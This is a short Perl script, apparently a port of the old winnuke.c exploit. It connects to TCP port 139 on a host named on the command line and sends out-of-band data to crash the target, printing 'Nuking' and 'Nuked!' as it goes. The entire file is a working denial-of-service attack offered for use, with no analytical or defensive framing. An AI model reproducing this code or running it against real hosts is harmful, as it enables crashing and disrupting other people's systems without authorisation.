#!/usr/bin/perl

# Ghent - ghent@bounty-hunters.com - Perl version of winnuke.c by _eci

use strict; use Socket;

my($h,$p,$in_addr,$proto,$addr);

$h = "$ARGV[0]"; $p = 139 if (!$ARGV[1]);
if (!$h) { print "A hostname must be provided. Ex: www.microsoft.com\n"; }

$in_addr = (gethostbyname($h))[4]; $addr = sockaddr_in($p,$in_addr);
$proto = getprotobyname('tcp');
socket(S, AF_INET, SOCK_STREAM, $proto) or die $!;

connect(S,$addr) or die $!; select S; $| = 1; select STDOUT;

print "Nuking: $h:$p\n"; send S,"Sucker",MSG_OOB; print "Nuked!\n"; close S;
